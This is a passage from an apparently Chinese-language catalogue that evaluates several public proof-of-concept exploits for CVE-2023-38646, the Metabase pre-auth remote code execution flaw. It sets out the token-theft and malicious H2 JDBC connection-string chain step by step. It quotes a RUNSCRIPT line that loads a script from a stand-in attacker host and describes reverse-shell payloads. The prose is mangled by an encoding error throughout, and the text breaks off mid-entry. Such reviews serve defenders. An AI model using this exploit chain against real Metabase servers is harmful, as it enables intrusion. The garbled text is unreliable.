å°½ç®¡è¯¥å·¥å…·ç®€åŒ–äº†æ¼æ´åˆ©ç”¨è¿‡ç¨‹ï¼Œä½†ä½¿ç”¨å®ƒä¹Ÿå¯èƒ½å¼•å…¥é£é™©ã€‚ç”¨æˆ·åº”è°¨æ…ä½¿ç”¨æ­¤å·¥å…·ï¼Œå¹¶å……åˆ†äº†è§£å…¶æ½œåœ¨çš„å±å®³ã€‚å»ºè®®åœ¨éç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨ï¼Œå¹¶è¿›è¡Œå……åˆ†çš„å®‰å…¨æµ‹è¯•ã€‚

**é£é™©æ¦‚ç‡ï¼š**

è€ƒè™‘åˆ°å†…å­˜é©¬æ³¨å…¥çš„é£é™©ï¼Œä¸”è¯¥POCå·¥å…·ç”±ä¸ªäººå¼€å‘è€…æä¾›ï¼Œå¹¶éæ¥è‡ªå®˜æ–¹æˆ–ä¿¡èª‰è‰¯å¥½çš„å®‰å…¨å‚å•†ï¼Œå› æ­¤ç»¼åˆè¯„ä¼°æŠ•æ¯’é£é™©ä¸º10%ã€‚è¿™ä¸ª10%ä¸»è¦æ¥è‡ªäºå¯¹ä½¿ç”¨è€…ç¼ºä¹å®‰å…¨æ„è¯†ä»¥åŠå¯¹å·¥å…·çš„æœªçŸ¥æ€§å¯èƒ½å¸¦æ¥çš„é£é™©ï¼Œè€Œéä»£ç æœ¬èº«ä¸€å®šå­˜åœ¨æ¶æ„åé—¨ã€‚

**é¡¹ç›®åœ°å€:** [Boogipop/MetabaseRceTools](https://github.com/Boogipop/MetabaseRceTools)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #4

**æ¥æº**: [CVE-2023-38646-BreezeGalaxy_CVE-2023-38646.md](../2023/CVE-2023-38646-BreezeGalaxy_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ä»¥é€šè¿‡HTTPè®¿é—®ï¼Œä¸”æœªè¿›è¡Œèº«ä»½éªŒè¯é…ç½®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´åˆ©ç”¨äº† Metabase å¤„ç†æ•°æ®åº“è¿æ¥çš„æ–¹å¼ï¼Œç‰¹åˆ«æ˜¯ H2 æ•°æ®åº“ã€‚æä¾›çš„ POC è„šæœ¬é¦–å…ˆè·å– setup tokenï¼Œç„¶ååˆ›å»ºä¸€ä¸ªç®¡ç†å‘˜è´¦æˆ·ï¼Œæœ€åæ·»åŠ ä¸€ä¸ªæ¶æ„çš„æ•°æ®åº“è¿æ¥ï¼Œè¯¥è¿æ¥åŒ…å«ä¸€ä¸ª H2 è¿æ¥å­—ç¬¦ä¸²ï¼Œå…¶ä¸­åŒ…å«åµŒå…¥å¼å‘½ä»¤ï¼Œå…è®¸æ”»å‡»è€…æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚è¿æ¥å­—ç¬¦ä¸²ä¸­çš„ `INIT=RUNSCRIPT FROM 'http://attacker-server.com/poc.sql'` æŒ‡ç¤º H2 ä»è¿œç¨‹æœåŠ¡å™¨æ‰§è¡Œ SQL è„šæœ¬ï¼Œè™½ç„¶ `poc.sql` æ–‡ä»¶æœ¬èº«æ— å®³ï¼Œä½†çœŸæ­£çš„æ”»å‡»è½½è·åµŒå…¥åœ¨è¿æ¥å­—ç¬¦ä¸²æœ¬èº«ï¼Œåˆ©ç”¨ `CREATE ALIAS` åˆ›å»ºä¸€ä¸ªJavaå‡½æ•°,ä»è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚\n\n**åˆ©ç”¨æ–¹å¼ï¼š**\n1. **è·å– Setup Token:**  é€šè¿‡è®¿é—® `/api/session/properties` è·å–åˆå§‹è®¾ç½®æ‰€éœ€çš„ tokenã€‚\n2. **è®¾ç½®ç®¡ç†å‘˜è´¦æˆ·:**  ä½¿ç”¨è·å–çš„ tokenï¼Œè°ƒç”¨ `/api/setup` åˆ›å»ºä¸€ä¸ªæ–°çš„ç®¡ç†å‘˜è´¦æˆ·ã€‚è¿™å°†åˆ›å»ºä¸€ä¸ªå…·æœ‰å¿…è¦æƒé™çš„ä¼šè¯ã€‚\n3. **æ·»åŠ æ¶æ„æ•°æ®åº“è¿æ¥:** ä½¿ç”¨æ–°åˆ›å»ºçš„ç®¡ç†å‘˜ä¼šè¯ï¼Œè°ƒç”¨ `/api/database` API æ·»åŠ ä¸€ä¸ªæ–°çš„æ•°æ®åº“ã€‚å…³é”®åœ¨äºæ„é€ æ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²ï¼Œåˆ©ç”¨ `INIT` å‚æ•°æ‰§è¡Œè¿œç¨‹ SQL è„šæœ¬ï¼Œè¯¥è„šæœ¬å®šä¹‰äº†ä¸€ä¸ª Java å‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ä¸ºäº†ç»•è¿‡æŸäº›é™åˆ¶ï¼Œé€šå¸¸åˆ©ç”¨ `CREATE ALIAS` åˆ›å»ºJavaå‡½æ•°,ä»è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚\n\n**æœ‰æ•ˆæ€§ï¼š** æä¾›çš„ PoC ä»£ç æ˜¯æœ‰æ•ˆçš„ï¼Œå®ƒèƒ½å¤Ÿåˆ©ç”¨è¯¥æ¼æ´åœ¨ Metabase å®ä¾‹ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œå¦‚æœç›®æ ‡å®ä¾‹çš„ç‰ˆæœ¬ä½äºå—å½±å“çš„ç‰ˆæœ¬ã€‚\n\n**æŠ•æ¯’é£é™©ï¼š** é£é™©ä¸º10%ï¼Œä¸»è¦é£é™©åœ¨äº `exploit.py` æ–‡ä»¶ä¸­`YOUR_GITPOD_WORKSPACE_URL` å¦‚æœä¸æ˜¯æ”»å‡»è€…è‡ªå·±çš„æœåŠ¡å™¨ï¼Œå­˜åœ¨è¢«ä¸­é—´äººæ”»å‡»æ›¿æ¢è¿æ¥çš„é£é™©. è™½ç„¶`poc.sql`ç›®å‰ä»…ä»…æ˜¯ `SELECT 1;`ï¼Œ ä½†æ˜¯å¦‚æœæœ‰äººæ¶æ„ä¿®æ”¹`poc.sql`ï¼Œåˆ™å­˜åœ¨è¢«æŠ•æ¯’é£é™©ã€‚ start.shä¸­çš„metabase.jaræ¥æºå¯èƒ½è¢«ç¯¡æ”¹ï¼Œå­˜åœ¨è¢«æŠ•æ¯’é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [BreezeGalaxy/CVE-2023-38646](https://github.com/BreezeGalaxy/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #5

**æ¥æº**: [CVE-2023-38646-CN016_Metabase-H2-CVE-2023-38646-.md](../2023/CVE-2023-38646-CN016_Metabase-H2-CVE-2023-38646-.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** MetabaseæœåŠ¡éœ€è¦å¯è®¿é—®ï¼Œæ— éœ€è®¤è¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´å­˜åœ¨äºMetabaseçš„setupæµç¨‹ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„JDBC URLæ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§:**
æä¾›çš„POCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒåŒ…å«ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š
1.  è·å–setup-tokenï¼šPOCé¦–å…ˆå°è¯•ä»`/api/session/properties`è·å–setup-tokenã€‚è¿™æ˜¯åˆ©ç”¨æ¼æ´çš„å‰æã€‚ä»æ¼æ´ä¿¡æ¯æ¥çœ‹ï¼Œè¿™ä¸ªæ¥å£ä¸éœ€è¦èº«ä»½éªŒè¯ã€‚
2.  æ„é€ Payloadï¼šPOCæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JDBC URLçš„JSON payloadã€‚è¯¥URLåˆ©ç”¨H2æ•°æ®åº“çš„`CREATE TRIGGER`åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å‘½ä»¤çš„æ‰§è¡Œæ˜¯é€šè¿‡è°ƒç”¨`java.lang.Runtime.getRuntime().exec()`å®ç°çš„ã€‚POCä¸­é»˜è®¤æ‰§è¡Œ`touch /tmp/success`ï¼Œè¿™æ˜¯ä¸€ä¸ªæ— å®³çš„å‘½ä»¤ï¼Œç”¨äºéªŒè¯æ¼æ´çš„å­˜åœ¨ã€‚
3.  å‘é€Payloadï¼šPOCå°†æ„é€ çš„payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚å¦‚æœæœåŠ¡å™¨è¿”å›åŒ…å«"Error creating or initializing trigger"çš„å“åº”ï¼Œåˆ™è¡¨æ˜æ¼æ´åˆ©ç”¨æˆåŠŸã€‚

**æŠ•æ¯’é£é™©:**
è™½ç„¶POCçš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£é™©ã€‚ä»¥ä¸‹æ˜¯åˆ†æï¼š
1. **`custom_base64_encode`å‡½æ•°:** è¿™ä¸ªå‡½æ•°å­˜åœ¨è¢«æ»¥ç”¨çš„å¯èƒ½ã€‚è™½ç„¶å…¶ç›®çš„æ˜¯å¯¹å‘½ä»¤è¿›è¡Œç¼–ç ï¼Œä½†å¦‚æœç”¨äºç¼–ç æ¶æ„è„šæœ¬å¹¶æ‰§è¡Œï¼Œåˆ™ä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜ã€‚
2. **å‘½ä»¤æ‰§è¡Œ:** POCä¸­ä½¿ç”¨`java.lang.Runtime.getRuntime().exec()`æ‰§è¡Œå‘½ä»¤ã€‚è¿™æœ¬èº«å°±å¾ˆå±é™©ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»ä½•å‘½ä»¤ï¼ŒåŒ…æ‹¬ä¸‹è½½å’Œæ‰§è¡Œæ¶æ„è„šæœ¬ã€‚
3. **é»˜è®¤å‘½ä»¤:** è™½ç„¶POCé»˜è®¤æ‰§è¡Œçš„æ˜¯`touch /tmp/success`ï¼Œä½†æ”»å‡»è€…å¯ä»¥å¾ˆå®¹æ˜“åœ°ä¿®æ”¹`-c`å‚æ•°æ¥æ‰§è¡Œä»»ä½•å…¶ä»–å‘½ä»¤ã€‚å¦‚æœPOCè¢«åˆ†å‘å¹¶è¢«ç¼ºä¹ç»éªŒçš„ç”¨æˆ·ä½¿ç”¨ï¼Œä»–ä»¬å¯èƒ½ä¼šç›´æ¥æ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„å‘½ä»¤ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©ä¸»è¦åœ¨äºä½¿ç”¨è€…å¯èƒ½å—åˆ°æ¶æ„å‘½ä»¤çš„å½±å“ã€‚`custom_base64_encode`å‡½æ•°å’Œå‘½ä»¤æ‰§è¡Œæœºåˆ¶ä¹Ÿä¸ºæ½œåœ¨çš„æ¶æ„è¡Œä¸ºæä¾›äº†å¯èƒ½æ€§ã€‚é£é™©è¯„ä¼°ä¸º 10%ï¼Œä¸»è¦æ¥æºäºä½¿ç”¨è€…æ²¡æœ‰å®‰å…¨æ„è¯†ï¼Œç›´æ¥æ‰§è¡Œäº†æ¶æ„å‘½ä»¤ï¼Œæˆ–è€…ä»£ç åº“çš„ä¸‹è½½æºè¢«æ›¿æ¢ã€‚

**åˆ©ç”¨æ–¹å¼:**
1.  æ”»å‡»è€…é¦–å…ˆå‘`/api/session/properties`å‘é€GETè¯·æ±‚ä»¥è·å–setup-tokenã€‚
2.  ç„¶åï¼Œæ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JDBC URLçš„JSON payloadã€‚æ¶æ„JDBC URLåˆ©ç”¨H2æ•°æ®åº“çš„`CREATE TRIGGER`åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºä¸€ä¸ªåœ¨`INFORMATION_SCHEMA.TABLES`ä¸Šè§¦å‘çš„triggerï¼Œå¹¶åœ¨è§¦å‘æ—¶æ‰§è¡ŒJavaä»£ç ã€‚Javaä»£ç è°ƒç”¨`java.lang.Runtime.getRuntime().exec()`æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…å°†æ„é€ çš„payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚
4.  å¦‚æœæœåŠ¡å™¨æˆåŠŸåˆ›å»ºäº†triggerï¼Œåˆ™æ”»å‡»æˆåŠŸï¼Œæ”»å‡»è€…æ‰§è¡Œçš„å‘½ä»¤å°†åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [CN016/Metabase-H2-CVE-2023-38646-](https://github.com/CN016/Metabase-H2-CVE-2023-38646-)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #6

**æ¥æº**: [CVE-2023-38646-DaniTheHack3r_CVE-2023-38646.md](../2023/CVE-2023-38646-DaniTheHack3r_CVE-2023-38646.md)

## CVE-2023-38646 Metabase RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ç½‘ç»œè®¿é—®ï¼Œä¸”ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæ­¤æ¼æ´çš„ä¸¥é‡ç¨‹åº¦ä¸ºé«˜å±ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥å®Œå…¨æ§åˆ¶å—å½±å“çš„æœåŠ¡å™¨ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Token:** POCä»£ç é¦–å…ˆå°è¯•ä» `[TARGET_URL]/api/session/properties` è·å– setup-tokenã€‚
2.  **æ„é€  Payload:** åˆ©ç”¨è·å–åˆ°çš„tokenï¼ŒPOCæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ payloadã€‚è¯¥å­—ç¬¦ä¸²ä¸­åŒ…å«å¯æ‰§è¡Œå‘½ä»¤ï¼ˆé€šè¿‡ `COMMAND` å‚æ•°ä¼ å…¥ï¼‰ï¼Œé€šå¸¸é€šè¿‡ Base64 ç¼–ç è¿›è¡Œæ··æ·†ã€‚
3.  **å‘é€ Payload:** æ„é€ å¥½çš„payloadä¼šè¢«å‘é€åˆ° Metabase æœåŠ¡å™¨ï¼Œåˆ©ç”¨å…¶å¯¹æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²å¤„ç†ä¸å½“çš„æ¼æ´ï¼Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ã€‚
4.  **å‘½ä»¤æ‰§è¡Œ:**  é€šè¿‡åˆ›å»ºè§¦å‘å™¨å’Œåˆ©ç”¨H2æ•°æ®åº“ç‰¹æ€§ï¼Œå®ç°åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æ ¹æ®æ¼æ´æè¿°ã€æœç´¢å¼•æ“ç»“æœï¼ˆä¾‹å¦‚ï¼Œ[https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646/](https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646/) ï¼‰å’ŒPOCä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§è¾ƒé«˜ã€‚å¤šä¸ªæ¥æºè¡¨æ˜ï¼Œè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

POCä»£ç ä¸­å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡Œå‘½ä»¤ï¼Œä½†ä»£ç ä¸­å­˜åœ¨ä»¥ä¸‹æ½œåœ¨çš„é£é™©ç‚¹ï¼š

*   **è‡ªå®šä¹‰ Base64 ç¼–ç :**  `CustomBase64Encode` å‡½æ•°ä½¿ç”¨è‡ªå®šä¹‰çš„ Base64 ç¼–ç æ–¹å¼ï¼Œè™½ç„¶ç›®çš„æ˜¯ä¸ºäº†ç¬¦åˆæ¼æ´åˆ©ç”¨çš„è¦æ±‚ï¼Œä½†ä¹Ÿå¯èƒ½è¢«ç”¨æ¥éšè—æ¶æ„ä»£ç ã€‚
*   **Payload æ„é€ :** Payloadçš„æ„é€ è¿‡ç¨‹æ¯”è¾ƒå¤æ‚ï¼Œæ”»å‡»è€…å¯èƒ½åœ¨payloadä¸­åµŒå…¥é¢å¤–çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚ï¼Œåœ¨è¿æ¥å­—ç¬¦ä¸²ä¸­æ·»åŠ é¢å¤–çš„å‚æ•°ï¼Œä»¥ä¾¿åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚
*   **ä»£ç†è®¾ç½®:** æ¶æ„æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡ä»£ç†æœåŠ¡å™¨å‘èµ·æ”»å‡», ä»è€Œéšè—è‡ªå·±çš„èº«ä»½ä¿¡æ¯.

å°½ç®¡å¦‚æ­¤ï¼Œæ ¹æ®ä»£ç æœ¬èº«ï¼Œå¤§éƒ¨åˆ†ä»£ç æ˜¯ç”¨äºå®ç°æ¼æ´åˆ©ç”¨åŠŸèƒ½çš„ï¼ŒæŠ•æ¯’çš„å¯èƒ½æ€§ç›¸å¯¹è¾ƒä½ï¼Œä¼°è®¡åœ¨10%å·¦å³ã€‚éœ€è¦äººå·¥å®¡æ ¸Payloadæ„é€ éƒ¨åˆ†ã€‚


**é¡¹ç›®åœ°å€:** [DaniTheHack3r/CVE-2023-38646](https://github.com/DaniTheHack3r/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #7

**æ¥æº**: [CVE-2023-38646-Ego1stoo_CVE-2023-38646.md](../2023/CVE-2023-38646-Ego1stoo_CVE-2023-38646.md)

## CVE-2023-38646 Metabase Pre-Auth RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 å’Œ Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ Metabase å®ä¾‹éœ€è¦è¿è¡Œåœ¨å—å½±å“çš„ç‰ˆæœ¬èŒƒå›´å†…ï¼Œå¹¶ä¸”æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®åˆ°è¯¥å®ä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´çš„åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š

1.  **æ¼æ´åŸç†ï¼š** Metabase å­˜åœ¨ä¸€ä¸ªæœªæˆæƒçš„ `/api/setup/validate` æ¥å£ï¼Œè¯¥æ¥å£ç”¨äºåœ¨ Metabase é¦–æ¬¡è®¾ç½®æ—¶éªŒè¯æ•°æ®åº“è¿æ¥ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¥å£ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚
2.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   é¦–å…ˆï¼Œæ”»å‡»è€…è®¿é—® Metabase å®ä¾‹çš„æ ¹è·¯å¾„ï¼Œè·å– `setup-token`ã€‚è¿™ä¸ªtokenè¢«åµŒå…¥åœ¨HTMLå“åº”çš„JavaScriptä»£ç ä¸­ï¼Œç”¨äºåç»­çš„è®¾ç½®è¿‡ç¨‹ã€‚
    *   ç„¶åï¼Œæ”»å‡»è€…å‘ `/api/setup/validate` æ¥å£å‘é€ POST è¯·æ±‚ï¼Œè¯·æ±‚ä½“åŒ…å«ä¸€ä¸ªæ¶æ„çš„ JSON å¯¹è±¡ã€‚è¿™ä¸ª JSON å¯¹è±¡çš„ `details.details.db` å­—æ®µåŒ…å«ä¸€ä¸ªç‰¹åˆ¶çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¿™ä¸ªè¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥äº†æ¶æ„ä»£ç ï¼Œåˆ©ç”¨ H2 æ•°æ®åº“çš„ `TRACE_LEVEL_SYSTEM_OUT` å’Œ `CREATE TRIGGER` åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„çš„ shell å‘½ä»¤ã€‚
    *   POCä»£ç æ„é€ äº†ä¸€ä¸ªåå¼¹shellçš„payloadï¼Œå°†ç›®æ ‡æœºå™¨ä¸Šçš„è¾“å…¥è¾“å‡ºé‡å®šå‘åˆ°æ”»å‡»è€…æ§åˆ¶çš„æœºå™¨ä¸Šï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
3.  **æŠ•æ¯’é£é™©åˆ†æï¼š**
    è™½ç„¶æä¾›çš„ä»£ç ä¸»è¦æ˜¯ç”¨äºæ¼æ´åˆ©ç”¨ï¼Œä½†ä»å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚é£é™©ç‚¹ä¸»è¦å­˜åœ¨äº`CVE-2023-38646.py`è„šæœ¬ä¸­çš„`payload`å˜é‡ã€‚å½“å‰çš„`payload`ç”¨äºåˆ›å»ºä¸€ä¸ªåå‘shellè¿æ¥ï¼Œè™½ç„¶æœ¬èº«ä¸æ˜¯æ¶æ„ä»£ç ï¼Œä½†å¯èƒ½è¢«ä¿®æ”¹ä¸ºæ‰§è¡Œæ›´å…·ç ´åæ€§çš„æ“ä½œã€‚å¦å¤–ï¼Œä½œè€…æä¾›çš„githubé“¾æ¥ä¸­çš„å›¾ç‰‡å¯èƒ½æ˜¯ç»è¿‡ä¿®æ”¹çš„ã€‚
    æ€»ä½“è€Œè¨€ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä½†éœ€è¦ä»”ç»†å®¡æŸ¥ä»£ç ï¼Œç¡®ä¿å…¶æ²¡æœ‰è¢«ç¯¡æ”¹æˆ–æ·»åŠ æ¶æ„åŠŸèƒ½ã€‚


**é¡¹ç›®åœ°å€:** [Ego1stoo/CVE-2023-38646](https://github.com/Ego1stoo/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #8

**æ¥æº**: [CVE-2023-38646-JayRyz_CVE-2023-38646-PoC-Metabase.md](../2023/CVE-2023-38646-JayRyz_CVE-2023-38646-PoC-Metabase.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“ç‰ˆæœ¬ï¼Œä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæ­¤æ¼æ´å½±å“Metabaseå¼€æºç‰ˆæœ¬ä½äº0.46.6.1å’ŒMetabaseä¼ä¸šç‰ˆæœ¬ä½äº1.46.6.1ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Tokenï¼š** åˆ©ç”¨ PoC ä»£ç ä¸­çš„ `get_token` å‡½æ•°ï¼Œé€šè¿‡è®¿é—® `/api/session/properties` æ¥å£è·å– setup-tokenã€‚
2.  **æ„é€ æ¶æ„Payloadï¼š** åˆ©ç”¨è·å–çš„ setup-token, æ„é€ åŒ…å«æ¶æ„å‘½ä»¤çš„payloadã€‚PoC ä»£ç ä½¿ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥æ¶æ„ SQL è¯­å¥ï¼Œè¯¥è¯­å¥åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼ˆTRIGGERï¼‰ï¼Œåœ¨è§¦å‘å™¨ä¸­æ‰§è¡Œå‘½ä»¤ã€‚å‘½ä»¤ä½¿ç”¨äº†åå¼¹shellçš„æŠ€æœ¯ã€‚ é¦–å…ˆå°†è¦æ‰§è¡Œçš„shellå‘½ä»¤è¿›è¡Œbase64ç¼–ç , ç„¶ååˆ©ç”¨`java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œå‘½ä»¤ã€‚
